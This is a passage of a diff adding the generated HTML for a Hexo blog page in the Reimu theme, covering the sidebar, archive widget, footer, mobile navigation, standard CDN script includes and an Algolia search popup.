+            <div class="sidebar-state-category">
+                <div>Categories</div>
+                <div class="sidebar-state-number">0</div>
+            </div>
+            <div class="sidebar-state-tag">
+                <div>Tags</div>
+                <div class="sidebar-state-number">0</div>
+            </div>
+        </div>
+        <div class="sidebar-social">
+            
+                <div class=icon-github>
+                    <a href=https://github.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-google>
+                    <a href=https://plus.google.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-twitter>
+                    <a href=https://twitter.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-facebook>
+                    <a href=https://www.facebook.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+        </div>
+        <div class="sidebar-menu">
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Home</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/archives"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Archives</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/about"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">About</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/friend"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Friend</div>
+                </div>
+            
+        </div>
+    </div>
+    
+        
+
+    
+        
+
+    
+        
+    <div class="widget-wrap wow fadeInRight">
+        <h3 class="widget-title">Archives</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
+        </div>
+    </div>
+
+
+    
+</aside>
+
+                
+            </div>
+            <footer id="footer" class="wow fadeInUp">
+    <div style="width: 100%; overflow: hidden"><div class="footer-line"></div></div>
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            
+            <div>
+                <span class="icon-copyright"></span>
+                2020-2024
+                <span class="footer-info-sep"></span>
+                John Doe
+            </div>
+            
+                <div>
+                    Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+                    Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+                </div>
+            
+            
+                <div>
+                    <span class="icon-brush"></span>
+                    24.3k
+                    &nbsp;|&nbsp;
+                    <span class="icon-coffee"></span>
+                    01:36
+                </div>
+            
+            
+                <div>
+                    <span class="icon-eye"></span>
+                    <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+                    &nbsp;|&nbsp;
+                    <span class="icon-user"></span>
+                    <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+                </div>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+        <nav id="mobile-nav">
+    <div class="sidebar-wrap">
+        <div class="sidebar-author">
+            <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="John Doe" class="lazyload">
+            <div class="sidebar-author-name">John Doe</div>
+            <div class="sidebar-description"></div>
+        </div>
+        <div class="sidebar-state">
+            <div class="sidebar-state-article">
+                <div>Posts</div>
+                <div class="sidebar-state-number">23</div>
+            </div>
+            <div class="sidebar-state-category">
+                <div>Categories</div>
+                <div class="sidebar-state-number">0</div>
+            </div>
+            <div class="sidebar-state-tag">
+                <div>Tags</div>
+                <div class="sidebar-state-number">0</div>
+            </div>
+        </div>
+        <div class="sidebar-social">
+            
+                <div class=icon-github>
+                    <a href=https://github.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-google>
+                    <a href=https://plus.google.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-twitter>
+                    <a href=https://twitter.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-facebook>
+                    <a href=https://www.facebook.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+        </div>
+        <div class="sidebar-menu">
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Home</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/archives"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Archives</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/about"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">About</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/friend"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Friend</div>
+                </div>
+            
+        </div>
+    </div>
+</nav>
+
+        
+<script src="https://unpkg.com/jquery@3.7.0/dist/jquery.min.js"></script>
+
+
+<script src="https://unpkg.com/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://unpkg.com/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+    
+<script src="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+
+    
+<script src="https://unpkg.com/busuanzi@2.3.0/bsz.pure.mini.js"></script>
+
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+    <div class="site-search">
+        <div class="algolia-popup popup">
+            <div class="algolia-search">
+                <span class="algolia-search-input-icon"></span>
+                <div class="algolia-search-input" id="algolia-search-input"></div>
+            </div>
+
+            <div class="algolia-results">
+                <div id="algolia-stats"></div>
+                <div id="algolia-hits"></div>
+                <div id="algolia-pagination" class="algolia-pagination"></div>
+            </div>
+
+            <span class="popup-btn-close"></span>
+        </div>
+    </div>
+    </body>
+    </html>
+
